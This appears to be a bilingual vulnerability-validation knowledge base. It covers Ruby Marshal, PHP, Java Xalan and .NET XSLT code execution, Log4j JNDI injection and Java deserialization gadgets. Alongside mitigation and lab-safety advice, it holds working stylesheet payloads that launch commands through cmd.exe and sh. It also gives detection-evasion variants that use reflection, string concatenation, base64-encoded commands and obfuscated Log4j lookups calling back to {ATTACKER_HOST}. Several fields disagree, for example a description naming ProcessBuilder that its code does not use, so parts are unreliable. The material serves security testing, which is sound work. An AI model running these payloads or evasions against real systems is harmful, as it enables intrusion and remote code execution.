overview.zh: Ruby Marshal 不安全对象加载针对外部可控 Marshal 数据被直接加载的场景：对象恢复过程会触发 marshal_load/_load 回调与依赖库 gadget。验证 Base64 Marshal 串能否进入 Marshal.load 并执行。
overview.en: Unsafe Ruby Marshal loading targets externally controllable Marshal data loaded directly, where object restoration triggers marshal_load/_load callbacks and dependency gadgets. It validates whether Base64 Marshal strings reach Marshal.load and execute.

vulnerability.zh: 根因是签名 Cookie、作业参数或缓存条目可被外部修改并进入 Marshal.load；Marshal 流可指定类、实例变量和对象关系，加载器会解析进程可见常量并执行对象定义的恢复逻辑，依赖中的危险回调在业务校验之前运行。
vulnerability.en: The root cause is externally modifiable signed cookies, job arguments, or cache entries reaching Marshal.load; Marshal streams specify classes, instance variables, and object relations, and the loader resolves process-visible constants and executes restoration logic, so dangerous dependency callbacks run before business validation.

exploitation.zh: 按第 1 步逐条提交 Base64 编码的 Marshal 参数对象（{"cmd"=>"命令"} 结构，串以 ruby -rbase64 本地生成），记录响应与日志差异；命中判据为应用把还原字段传入命令执行点并返回对应输出（id/whoami 等）。确认加载能力后可替换为读取标记文件的等价对象链形成证据；注意区分 Base64 解码错误、未知类异常与真正对象实例化三种现象，并核对加载的类清单。
exploitation.en: Submit the Base64-encoded Marshal strings one by one per step 1 (object chains embedding cmd-argument constructs), recording response and log differences; a hit is the corresponding command output (id/whoami) returned after Marshal.load executes. Once loading is confirmed, substitute equivalent object chains reading marker files for evidence; distinguish Base64 decode errors, unknown-class exceptions, and genuine object instantiation, and audit the loaded class list.

mitigation.zh: 优先把外部交换格式迁移为 JSON 或显式字段协议；对必须保留的 Marshal 数据使用服务端密钥认证并在消费前验证完整性和版本；缩小加载进程的依赖、权限与网络访问，并为 Marshal.load 调用和异常类实例化建立审计。修复后重放第 1 步串，确认被拒绝。
mitigation.en: Prefer migrating external exchange formats to JSON or explicit field protocols; protect mandatory Marshal data with server-side key authentication and verify integrity and version before consumption; shrink loader-process dependencies, permissions, and network access, and audit Marshal.load calls and anomalous class instantiation. After the fix, replay the step-1 strings and confirm rejection.

overview.zh: PHP XSLT 扩展函数代码执行针对不受信任样式表调用 php:function 的场景：system 等进程函数被暴露为转换期 Sink。验证含 PHP 命名空间的样式表能否在转换时执行宿主命令。
overview.en: PHP XSLT extension-function code execution targets untrusted stylesheets calling php:function, exposing process functions like system as transform-time sinks. It validates whether a stylesheet with the PHP namespace can execute host commands during transformation.

vulnerability.zh: 若服务端把上传或拼接的 XSLT 当作可信代码执行并启用 registerPHPFunctions，样式表表达式可跨越数据转换边界调用 system；仅解析 XML 并不等于执行，根因是扩展函数暴露与不可信样式表共存。
vulnerability.en: If the server executes uploaded or spliced XSLT as trusted code with registerPHPFunctions enabled, stylesheet expressions can cross the data-transformation boundary to call system; parsing XML alone is not execution—the root cause is extension-function exposure coexisting with untrusted stylesheets.

exploitation.zh: 按第 1 步提交含 xmlns:php 命名空间与 php:function('system','id') 的完整样式表到目标转换入口；命中判据为转换输出包含 uid= 的命令结果。确认执行后可把函数参数替换为标记命令形成证据；若无输出，依次排查 registerPHPFunctions 是否启用、样式表是否被完整接受与转换进程权限，三项缺一即不成立。
exploitation.en: Per step 1, submit the complete stylesheet with the xmlns:php namespace and php:function('system','id') to the target transform entry; a hit is uid= command output in the transform result. Once execution is confirmed, swap function arguments for marker commands as evidence; without output, check in turn whether registerPHPFunctions is enabled, whether the stylesheet was fully accepted, and transform-process permissions—any missing means the chain fails.

mitigation.zh: 禁止用户控制可执行样式表；关闭 PHP XSL 扩展函数注册并采用无扩展的受限处理器；以低权限隔离转换进程、限制文件与网络访问，并对允许的模板做完整性校验。修复后重放第 1 步样式表，确认 php:function 被拒绝且正常转换可用。
mitigation.en: Forbid user-controlled executable stylesheets; disable PHP XSL extension-function registration and use a restricted extension-free processor; isolate transform processes with low privilege, restrict file and network access, and verify template integrity. After the fix, replay the step-1 stylesheet and confirm php:function is rejected while normal transforms work.

analysis.zh: 阳性证据是目标 Xalan 处理器把攻击者命名空间映射到宿主测试类并调用方法产生 canary，TransformerFactory、类加载和调用栈相符。 假阳性边界：stylesheet 中存在 Runtime URI、处理器换成 Saxon/JDK 内置、secure-processing 拒绝扩展、类找不到、XPath 错误或命令文本回显均不是执行。
analysis.en: Positive evidence requires the target Xalan processor to map the attacker namespace to the host test class and invoke its method to produce a canary, with TransformerFactory, class loading, and call stack aligned. False-positive boundary: A Runtime URI in the stylesheet, use of Saxon or another processor, secure-processing rejection, a missing class, XPath errors, or reflected command text does not prove execution.

opsecTips.zh: 验证优先以返回固定 canary 的测试静态方法替代 Runtime/ProcessBuilder 样例；如需确认真实执行，仅提交 id 等只读命令；出现反射扩散、文件/网络访问、类加载异常或 JVM 不稳定时立即停止。
opsecTips.en: Java XSLT extension testing forbids Runtime, ProcessBuilder, and nontest classes; stop on processes, reflection expansion, file or network access, class-loading anomalies, or JVM instability.

opsecTips.zh: 销毁隔离 Transformer/JVM，删除测试类、stylesheet 与 canary，清理 TransformerFactory/模板缓存并恢复安全处理配置。
opsecTips.en: Destroy the isolated Transformer and JVM, delete test classes, stylesheets, and canaries, clear TransformerFactory and template caches, and restore secure-processing configuration.

wafBypass.command: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:x="http://xml.apache.org/xalan"><x:component prefix="x" functions="exec"/><xsl:template match="/"><xsl:value-of select="x:exec(new java.lang.String[]{"id"})"/></xsl:template></xsl:stylesheet>

description.zh: 用 Xalan 扩展函数走 ProcessBuilder 路径，绕过 Runtime.getRuntime().exec 特征；成功判据：输出含 uid。
description.en: Routes execution through an Xalan extension using ProcessBuilder, evading Runtime.getRuntime().exec signatures. Success: output contains uid.

description.zh: 经 Class.forName 反射获取 Runtime，规避 getRuntime().exec 直连模式匹配；成功判据：进程创建可验证。
description.en: Obtains Runtime via Class.forName reflection to evade direct getRuntime().exec pattern matching. Success: process creation is verifiable.

wafBypass.command: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:x="http://xml.apache.org/xalan"><xsl:template match="/"><xsl:value-of select="x:exec(new java.lang.String[]{"/bin/sh","-c","echo aWQ=|base64 -d|sh"})"/></xsl:template></xsl:stylesheet>

description.zh: 命令经 sh -c base64 解码执行，规避命令明文；" 实体编码绕过引号检测；成功判据：命令输出回显。
description.en: Executes a base64 command via sh -c, with " entity encoding to bypass quote inspection. Success: command output reflected.

title.zh: 识别 Xalan 与安全模式

description.zh: 先确认实际 Java 转换实现、扩展命名空间支持和 secure-processing 配置状态。
description.en: Identify the actual Java transform implementation, extension-namespace support, and secure-processing configuration.

title.zh: 执行 Runtime 扩展探针

description.zh: 提交原始 Xalan 样式表并关联转换响应、Java 子进程事件以及服务端审计记录。
description.en: Submit the original Xalan stylesheet and correlate the transform response, Java child-process events, and server audit records.

description.zh: 启用安全处理和扩展禁用策略后复测，确认正常 XSLT 输出保留但 Runtime 调用消失。
description.en: Retest with secure processing and extension blocking to confirm normal XSLT output remains while Runtime invocation disappears.

overview.zh: Java Xalan XSLT 扩展代码执行针对攻击者控制的命名空间映射到 Runtime 等宿主类的场景：转换表达式可调用进程执行。验证 Xalan 风格扩展命名空间能否在转换期启动命令。
overview.en: Java Xalan XSLT extension code execution targets attacker-controlled namespaces mapping to host classes like Runtime, letting transform expressions invoke process execution. It validates whether Xalan-style extension namespaces can launch commands during transformation.

vulnerability.zh: 应用若允许上传、覆盖或拼接 XSLT，并使用可反射调用 Java 类的方法解析扩展命名空间，数据转换模板便成为代码；处理器安全特性、类加载策略和服务账号权限共同决定影响，单独看到 Runtime 字符串不能证明调用发生。
vulnerability.en: If the application allows XSLT upload, overwrite, or splicing and resolves extension namespaces via methods that reflectively invoke Java classes, data-transformation templates become code; processor security features, class-loading policy, and service-account permissions jointly determine impact—seeing the Runtime string alone proves no invocation.

exploitation.zh: 按第 1 步提交映射 java.lang.Runtime 的扩展命名空间样式表，先以 getRuntime 与 exec('id') 组合验证调用链；命中判据为转换输出包含对应命令结果。确认执行后可替换为标记命令；无输出时依次确认处理器是否为 Xalan、扩展函数是否被安全模式禁用、不可信样式表是否真实参与转换，三者缺一则该链不适用于目标。
exploitation.en: Per step 1, submit the stylesheet mapping the java.lang.Runtime extension namespace, first validating the invocation chain with getRuntime and exec('id'); a hit is the corresponding command output in the transform result. Once confirmed, substitute marker commands; without output, confirm in turn that the processor is Xalan, extension functions are not disabled by secure processing, and the untrusted stylesheet genuinely participates in transformation—if any fails, the chain does not apply to the target.

mitigation.zh: 只执行受版本控制且签名的 XSLT；启用 JAXP 安全处理并禁止外部扩展函数与任意类解析；在无网络、只读文件系统和低权限账号中运行转换，同时监控异常子进程。修复后重放第 1 步样式表，确认扩展命名空间被拒绝。
mitigation.en: Execute only version-controlled, signed XSLT; enable JAXP secure processing and forbid external extension functions and arbitrary class resolution; run transforms without network, on read-only filesystems, under low-privilege accounts, and monitor anomalous child processes. After the fix, replay the step-1 stylesheet and confirm the extension namespace is rejected.

name.zh: .NET msxsl:script 代码执行

description.zh: 验证 .NET XSLT 转换是否接受攻击者提供的 msxsl:script 脚本块，并在宿主进程中编译执行 C# 代码。
description.en: Tests whether a .NET XSLT transformation accepts an attacker-provided msxsl:script block and compiles and executes C# code in the host process.

prerequisites.zh: 攻击者 XSLT 进入 .NET XslCompiledTransform，XsltSettings.EnableScript 为真且 msxsl:script 可由宿主编译，运行时版本可核验。
prerequisites.en: An attacker XSLT reaches .NET XslCompiledTransform with XsltSettings.EnableScript true and msxsl:script compilable by the host, with runtime version verifiable.

prerequisites.zh: 脚本块只定义返回固定 canary 的纯函数，跟踪 CodeDOM/脚本编译和扩展方法调用；原 Process/cmd.exe 样例不执行。
prerequisites.en: The script block defines only a pure function returning a fixed canary, with CodeDOM or script compilation and extension calls traced; source Process and cmd.exe samples are not executed.

execution.command:
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="http://example.com/my"><msxsl:script language="C#" implements-prefix="my"><![CDATA[ public string exec(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c id"; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); return proc.StandardOutput.ReadToEnd(); }]]></msxsl:script><xsl:template match="/"><xsl:value-of select="my:exec()"/></xsl:template></xsl:stylesheet>
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="http://example.com/my"><msxsl:script language="C#" implements-prefix="my"><![CDATA[ public string exec(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c whoami"; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); return proc.StandardOutput.ReadToEnd(); }]]></msxsl:script><xsl:template match="/"><xsl:value-of select="my:exec()"/></xsl:template></xsl:stylesheet>

<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="http://example.com/my"><msxsl:script language="C#" implements-prefix="my"><![CDATA[ public string exec(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c dir"; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); return proc.StandardOutput.ReadToEnd(); }]]></msxsl:script><xsl:template match="/"><xsl:value-of select="my:exec()"/></xsl:template></xsl:stylesheet>

description.zh: XSLT .NET RCE包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：转换时 msxsl:script 内代码执行并输出命令结果。
description.en: XSLT .NET RCE contains multiple reproducible input samples; test them individually and record response and log differences. Success check: during transformation the msxsl:script code executes and emits the command result.

analysis.zh: 阳性证据是目标转换器接受 msxsl:script、在宿主编译测试 C# 并从 XSLT 调用返回 canary，程序集、任务和调用栈连续关联。 假阳性边界：XML parser 接受 script 元素、EnableScript=false 抛错、仅编译 XSLT 不编译 C#、脚本代码出现在错误或另一 .NET 配置成功均不是 RCE。
analysis.en: Positive evidence requires the target transformer to accept msxsl:script, compile test C# in the host, and invoke it from XSLT to return a canary, correlating assembly, job, and call stack. False-positive boundary: XML acceptance of the script element, an EnableScript=false error, XSLT compilation without C# compilation, script code in errors, or success under another .NET configuration does not prove RCE.

opsecTips.zh: 验证优先以返回固定 canary 的纯函数脚本替代 Process 启动样例；如需确认真实执行，仅启动 cmd /c id 等只读命令；出现程序集落盘、文件/网络动作、AppDomain 异常或 worker 重启时立即停止。
opsecTips.en: .NET XSLT script testing never starts Process or accesses host APIs; stop on assemblies written to disk, processes, file or network actions, AppDomain anomalies, or worker restarts.

opsecTips.zh: 终止测试 AppDomain/worker，删除脚本 stylesheet、临时程序集和 canary，清理 XSLT 缓存并恢复 EnableScript=false。
opsecTips.en: Terminate the test AppDomain or worker, delete script stylesheets, temporary assemblies, and canaries, clear XSLT caches, and restore EnableScript=false.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:test"><msxsl:script language="JScript" implements-prefix="user">function cmd(){return System.Diagnostics.Process.Start('cmd.exe','/c id');}</msxsl:script><xsl:template match="/"><xsl:value-of select="user:cmd()"/></xsl:template></xsl:stylesheet>

description.zh: 把脚本语言从 C# 换成 JScript 并用全限定名调用，绕过 C# 语法与 Process.Start 组合特征；成功判据：进程启动可观测。
description.en: Switches the script language from C# to JScript with fully-qualified calls, evading C# syntax and Process.Start signature pairs. Success: process launch observable.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:test"><msxsl:script language="C#" implements-prefix="user">public string x(){string a="Pro"+"cess."+"Start";return (string)typeof(System.Diagnostics.Process).InvokeMember(a,System.Reflection.BindingFlags.Static,null,null,new object[]{"cmd.exe","/c id"});}</msxsl:script><xsl:template match="/"><xsl:value-of select="user:x()"/></xsl:template></xsl:stylesheet>

description.zh: Process.Start 经反射调用且名称拼接构造，规避源码级关键词扫描；成功判据：命令输出回显。
description.en: Invokes Process.Start via reflection with a concatenated name, defeating source-level keyword scanning. Success: command output reflected.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:test"><msxsl:script language="C#" implements-prefix="user">public string x(){return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("aWQ="))!=null?System.Diagnostics.Process.Start("cmd.exe","/c "+System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("aWQ="))):"x";}</msxsl:script><xsl:template match="/"><xsl:value-of select="user:x()"/></xsl:template></xsl:stylesheet>

description.zh: 命令由 Convert.FromBase64String 运行时解码，源码中无明文命令；成功判据：进程执行 id 可观测。
description.en: Command is decoded at runtime via Convert.FromBase64String so no plaintext command exists in source. Success: id process observable.

description.zh: 确认使用的转换 API、运行时版本以及脚本和文档函数是否被显式启用。
description.en: Confirm the transform API, runtime version, and whether script and document functions are explicitly enabled.

description.zh: 回放原始样式表并从动态编译、进程事件和转换输出证明脚本的实际执行。
description.en: Replay the original stylesheet and prove script execution through dynamic compilation, process events, and transform output.

description.zh: 关闭 EnableScript 并隔离运行权限后重放，确认合法转换可用且脚本块被稳定拒绝。
description.en: Replay after disabling EnableScript and isolating privileges to confirm valid transforms work and script blocks are consistently rejected.

overview.zh: .NET msxsl:script 代码执行针对攻击者提供的 msxsl:script 脚本块被宿主编译执行的场景。验证支持脚本的 XSLT 引擎是否把 C# 代码块编译进宿主进程并执行。
overview.en: .NET msxsl:script code execution targets attacker-supplied msxsl:script blocks compiled and executed by the host. It validates whether a script-capable XSLT engine compiles the C# block into the host process and runs it.

vulnerability.zh: 如果应用将 XsltSettings.EnableScript 打开并允许外部提供样式表，脚本就绕过了数据转换边界，继承服务进程的文件、网络和进程权限；现代运行时可能直接拒绝脚本，必须区分功能不可用、编译失败与真正执行。
vulnerability.en: If the application enables XsltSettings.EnableScript and allows externally supplied stylesheets, scripts bypass the data-transformation boundary and inherit the service process's file, network, and process permissions; modern runtimes may reject scripts outright—distinguish feature unavailable, compile failure, and genuine execution.

exploitation.zh: 按第 1 步提交含 msxsl:script 与 xmlns:my 命名空间的完整样式表，脚本块内以 Process 启动命令并在模板中调用 user 函数；命中判据为转换时脚本内代码执行并输出命令结果。确认执行后可把命令替换为标记输出；无输出时核对 XslCompiledTransform 是否启用脚本设置与样式表是否完整参与转换，编译错误要单独记录。
exploitation.en: Per step 1, submit the complete stylesheet with msxsl:script and the xmlns:my namespace, launching a command via Process inside the script block and calling the user function from the template; a hit is the script code executing during transformation with command output. Once confirmed, swap commands for marker output; without output, check whether XslCompiledTransform has script settings enabled and whether the stylesheet fully participates in transformation—log compile errors separately.

mitigation.zh: 保持 XSLT 脚本功能关闭；只从受信仓库加载固定样式表并校验完整性；将转换放入低权限隔离进程，限制子进程、文件与网络能力并监控动态编译事件。修复后重放第 1 步样式表，确认脚本块被拒绝且正常转换可用。
mitigation.en: Keep XSLT scripting disabled; load fixed stylesheets only from trusted repositories with integrity checks; run transforms in low-privilege isolated processes, restricting child-process, file, and network capabilities, and monitor dynamic-compilation events. After the fix, replay the step-1 stylesheet and confirm script blocks are rejected while normal transforms work.

name.zh: Log4j JNDI Lookup 注入

description.zh: 验证不可信日志字段是否进入受影响的 Log4j Lookup 解析路径并触发 JNDI 名称解析或出站连接，覆盖 Log4Shell 及相邻配置风险。
description.en: Validate whether untrusted log fields reach an affected Log4j Lookup path and trigger JNDI name resolution or outbound connections, covering Log4Shell and related configuration risks.

prerequisites.zh: 不可信字段进入受影响 Log4j Core 的消息 Lookup 路径，确切版本、布局、message lookup 与 JNDI 配置可核验。
prerequisites.en: An untrusted field reaches the message Lookup path of affected Log4j Core, with exact version, layout, message-lookup behavior, and JNDI configuration verifiable.

prerequisites.zh: 所有公网地址（{ATTACKER_HOST} 的实际取值）一律替换为自有隔离 DNS/LDAP 令牌端点，端点不返回类或对象，日志事件和出站遥测共享唯一 ID。
prerequisites.en: All evil.com or public addresses are replaced by owned isolated tokenized DNS or LDAP endpoints that return no classes or objects, and log events share a unique identifier with egress telemetry.

title.en: Validation step 1 for Log4j JNDI Lookup Injection

description.zh: JNDI注入 (Log4Shell等)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：攻击者 LDAP 服务收到目标解析回连或带外记录出现。
description.en: Run this Log4j JNDI Lookup Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: the attacker LDAP service receives the target's lookup or an out-of-band record appears.

analysis.zh: 阳性证据是目标应用进程在记录特定输入时解析 JNDI Lookup，并向自有端点发出与该日志事件令牌匹配的 DNS/LDAP 请求；RCE 还需独立子进程 marker。 假阳性边界：payload 字符串被写入日志、分析机或扫描器查询 DNS、边界 DNS 预解析、普通网络连接、已修复版本告警或未关联回调都不能证明应用 Lookup。
analysis.en: Positive evidence requires the target application process to resolve the JNDI Lookup while logging the specific input and emit a token-matched DNS or LDAP request to the owned endpoint; RCE additionally needs separate child-process marker evidence. False-positive boundary: A payload string written to logs, DNS from an analyst or scanner, perimeter pre-resolution, an ordinary connection, a patched-version alert, or an uncorrelated callback does not prove application Lookup.

opsecTips.zh: Log4j JNDI 验证只允许一次 DNS/LDAP 解析，禁止类加载、RMI、重定向和真实目录；出现非自有目的地、下载、进程创建或请求风暴时停止。
opsecTips.en: Log4j JNDI validation permits one DNS or LDAP resolution only and forbids class loading, RMI, redirects, and real directories; stop on non-owned destinations, downloads, process creation, or request storms.

opsecTips.zh: 关闭 DNS/LDAP 监听器，删除令牌记录和测试日志，清理日志队列/缓存，升级并重启受影响进程后确认无延迟 Lookup。
opsecTips.en: Close DNS and LDAP listeners, delete token records and test logs, clear logging queues and caches, upgrade and restart affected processes, and confirm no delayed Lookup.

description.zh: 绕过对 ${jndi: 明文的拦截：嵌套 lower 查找把 j 还原成小写；成功判据：LDAP 回连到达 {ATTACKER_HOST}。
description.en: Bypasses blocking of the literal ${jndi: by nesting a lower lookup that restores the j. Success: LDAP callback reaches {ATTACKER_HOST}.

description.zh: 利用 ${::-x} 空默认值逐字符拼出 jndi:ldap，规避大小写与嵌套查找两类规则的覆盖盲区；成功判据：OAST 收到 DNS/HTTP 请求。
description.en: Assembles jndi:ldap char-by-char via ${::-x} empty defaults, dodging both case-based and nested-lookup rules. Success: OAST receives DNS/HTTP hits.

description.zh: 目标主机名经 env 查找内插，查找串中无完整外部域名明文；成功判据：oast.example.com 收到带用户名前缀的解析。
description.en: Interpolates the host via an env lookup so no full external domain appears literally. Success: oast.example.com receives a query prefixed with the username.

title.zh: 确认运行时 Log4j 版本

description.zh: 核对打包、容器和实际类路径，避免仅凭锁文件判断漏洞状态。
description.en: Inspect packages, containers, and the active classpath rather than inferring status from a lock file alone.

title.zh: 关联唯一 JNDI 观察令牌
title.en: Correlate a unique JNDI observation token

description.zh: 在隔离网络提交原始变体，并把请求 ID 与自有解析服务和出口日志对应起来。
description.en: Submit an original variant in an isolated network and correlate its request ID with owned resolution services and egress logs.

description.zh: 清除旧类库并升级后重放相同令牌，确认日志功能保留而名称解析与出站连接均不再发生。
description.en: After removing old libraries and upgrading, replay the same token and confirm logging remains functional while name resolution and outbound connections no longer occur.

overview.zh: Log4j JNDI Lookup 注入针对不可信日志字段进入受影响 Log4j Lookup 解析路径的场景：可触发 JNDI 名称解析或出站连接。验证 ${jndi:ldap://} 默认端口与 389/636/1389 及高位端口等变体对自有观察端的回连。
overview.en: Log4j JNDI lookup injection targets untrusted log fields entering affected Log4j lookup resolution, able to trigger JNDI name resolution or outbound connections. It validates ${jndi:ldap://} in four port forms calling back to your own observer.

vulnerability.zh: 受影响的 Log4j 2 版本会在记录消息或参数时解析 Lookup 表达式，JNDI Lookup 可根据输入访问 LDAP、RMI 或其他名称服务；缺少版本修复、组件移除和出站限制时，攻击者控制的日志字段可扩展为远程资源解析并形成代码执行链。
vulnerability.en: Affected Log4j 2 versions resolve lookup expressions when logging messages or parameters, and the JNDI lookup can reach LDAP, RMI, or other naming services per input; without version fixes, component removal, and egress restrictions, attacker-controlled log fields extend into remote resource resolution and code-execution chains.

exploitation.zh: 先在攻击者侧部署无害 DNS/LDAP 观察端并生成唯一请求标识，再按第 1 步把 ${jndi:ldap://{ATTACKER_HOST}/a} 及 1389/389/636 端口变体注入常见日志字段（User-Agent、X-Api-Version 等）；命中判据为攻击者 LDAP 服务收到目标解析回连或带外记录出现。把唯一标识与应用日志、解析请求和出站流量逐一关联；看到 ${jndi:...} 被记录不等于触发。
exploitation.en: Deploy a harmless DNS/LDAP observer attacker-side with unique request identifiers first, then inject ${jndi:ldap://{ATTACKER_HOST}/a} and the 1389/389/636 port variants into common log fields (User-Agent, X-Api-Version, etc.) per step 1; a hit is the target's resolution callback at your LDAP service or outbound records appearing. Correlate the unique identifier with application logs, resolution requests, and outbound traffic; ${jndi:...} merely being logged is not a trigger.

mitigation.zh: 升级到 Apache 公告认可的 Log4j 版本并清除旧副本；移除不需要的 JNDI Lookup 能力，网络层阻断到非授权 LDAP/RMI/DNS 的出口，集中记录 Lookup 异常与异常解析请求。修复后重放第 1 步注入，确认无回连。
mitigation.en: Upgrade to Log4j versions endorsed by the Apache advisory and purge old copies; remove unneeded JNDI lookup capability, block egress to unauthorized LDAP/RMI/DNS at the network layer, and centrally record lookup anomalies and anomalous resolution requests. After the fix, replay the step-1 injections and confirm zero callbacks.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: Java 原生反序列化与 Commons Collections Gadget
name.en: Java Deserialization with Commons Collections Gadgets

description.zh: 验证外部 Java 序列化流是否进入 ObjectInputStream，并借类路径中的 Commons Collections 等 Gadget 在 readObject 阶段触发非预期方法链。
description.en: Validate whether an external Java serialization stream reaches ObjectInputStream and uses gadgets such as Commons Collections on the classpath to trigger unintended method chains during readObject.

prerequisites.zh: 外部 Java 序列化字节进入 ObjectInputStream.readObject，JDK、序列化过滤器和 Commons Collections 等实际类路径版本均可核验。
prerequisites.en: External Java serialization bytes reach ObjectInputStream.readObject, with JDK, serialization filters, and actual classpath versions such as Commons Collections verifiable.

prerequisites.zh: 先离线解析源十六进制流的类描述符，确认多数行是头/普通类片段；真实验证使用只调用固定 marker 的测试 Gadget，而非命令链。
prerequisites.en: Source hexadecimal streams are parsed offline to identify class descriptors and confirm that many lines are headers or ordinary class fragments; live validation uses a test gadget that calls only a fixed marker rather than a command chain.

title.en: Validation step 1 for Java Deserialization with Commons Collections Gadgets

description.zh: Java反序列化 (Commons Collections)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：反序列化后行为与基线出现差异（异常、延迟或命令副作用）。
description.en: Run this Java Deserialization with Commons Collections Gadgets validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: deserialization diverges from the baseline (exception, delay, or command side effect).

analysis.zh: 阳性证据是完整可控对象图被目标 ObjectInputStream 实例化，并通过目标类路径上的已确认 Gadget 调用测试 marker；输入头或类名本身不够。 假阳性边界：aced0005 魔数、HashMap/JarFile/URL 类名、反序列化成功返回普通集合、InvalidClassException、过滤器拒绝或 ysoserial 能生成别的链均不是当前 RCE。
analysis.en: Positive evidence requires a complete controlled object graph to be instantiated by the target ObjectInputStream and invoke the test marker through a confirmed gadget on the target classpath; stream headers or class names alone are insufficient. False-positive boundary: The aced0005 magic, HashMap, JarFile, or URL class names, successful deserialization into an ordinary collection, InvalidClassException, filter rejection, or ysoserial generating another chain does not prove this RCE.

opsecTips.zh: Java 反序列化验证禁止执行真实 Commons Collections 命令 Gadget；出现进程、JNDI/网络、文件写入、类加载异常或 JVM 不稳定时停止。
opsecTips.en: Java deserialization validation never executes a real Commons Collections command gadget; stop on processes, JNDI or network access, file writes, class-loading anomalies, or JVM instability.

opsecTips.zh: 销毁隔离 JVM，删除对象流、marker 和临时类，清理消息队列/会话缓存，恢复 ObjectInputFilter 并重启测试服务。
opsecTips.en: Destroy the isolated JVM, delete object streams, markers, and temporary classes, clear message queues and session caches, restore ObjectInputFilter, and restart the test service.

description.zh: 绕过对 aced0005 十六进制魔数特征的检测：以 base64 形态传输序列化流；成功判据：{ATTACKER_HOST} 收到 cc6 回连。
description.en: Evades detection of the aced0005 hex magic by transporting the stream as base64. Success: cc6 callback reaches {ATTACKER_HOST}.

description.zh: 序列化流 gzip 压缩后魔数与 gadget 结构均不可见；成功判据：目标反序列化时执行 id（DNS/OAST 验证）。
description.en: Gzipping hides both the magic bytes and gadget structure. Success: target executes id on deserialization (verify via DNS/OAST).

description.zh: 改用 CB1 链规避仅覆盖 CommonsCollections 类名的规则，十六进制输出绕过 base64 特征；成功判据：DNSLog 收到解析。
description.en: Swaps to the CB1 chain to dodge rules matching only CommonsCollections class names, with hex output to avoid base64 signatures. Success: DNSLog receives the query.

title.zh: 核对 ObjectInputStream 与类路径

description.zh: 确认字节确实进入 Java 原生反序列化，并枚举运行时 Gadget 依赖及过滤器状态。
description.en: Confirm bytes reach native Java deserialization and inventory runtime gadget dependencies and filter state.

title.zh: 记录 Gadget 解析证据

description.zh: 在隔离 JVM 输入原始语料，采集类解析、过滤器决策、异常栈与受控回调。
description.en: Feed the original corpus to an isolated JVM and capture class resolution, filter decisions, stack traces, and controlled callbacks.

title.zh: 启用序列化过滤并迁移

description.zh: 应用严格过滤器并替换数据协议后，重放正常 DTO 和危险流，确认兼容数据通过而 Gadget 类被拒绝。
description.en: After applying strict filters and replacing the protocol, replay valid DTOs and dangerous streams to confirm compatible data passes while gadget classes are rejected.

overview.zh: Java 原生反序列化与 Commons Collections Gadget 针对外部序列化流进入 ObjectInputStream 的场景：类路径中的 Gadget 在 readObject 阶段触发非预期方法链。验证十六进制序列化流的目标接受与行为差异。
overview.en: Java native deserialization with Commons Collections gadgets targets external streams entering ObjectInputStream, where classpath gadgets trigger unexpected method chains during readObject. It validates target acceptance and behavioral differences of hex-encoded serialization streams.

vulnerability.zh: ObjectInputStream 会根据流中的类信息恢复对象并调用 readObject、readResolve 等生命周期方法；应用若接受不可信流且类路径包含可组合的反射、转换器或集合 Gadget，副作用可能在业务类型检查之前执行。
vulnerability.en: ObjectInputStream restores objects from in-stream class descriptors and invokes lifecycle methods like readObject and readResolve; if the application accepts untrusted streams while the classpath holds composable reflection, transformer, or collection gadgets, side effects can execute before business type checks.

exploitation.zh: 先用 ysoserial 等工具把第 1 步的 Commons Collections 链生成为十六进制序列化流（aced0005 开头），再逐条提交到目标反序列化点；命中判据为反序列化后行为与基线出现差异（异常、延迟或命令副作用）。先确认入口接受序列化字节并记录响应差异，再区分魔数识别、类恢复、gadget 触发与最终副作用四个阶段；建议先用 ysoserial 生成的标记命令载荷对照，确认哪条链在当前类路径可用。
exploitation.en: Per step 1, submit the hex-encoded serialization streams (aced0005-prefixed) to the target deserialization point one by one; a hit is post-deserialization behavior diverging from the baseline (exceptions, delays, or command side effects). First confirm the entry accepts serialized bytes and record response differences, then keep the four stages distinct—magic recognition, class restoration, gadget triggering, and final side effects; compare against ysoserial-generated marker-command payloads to identify which chain works on the current classpath.

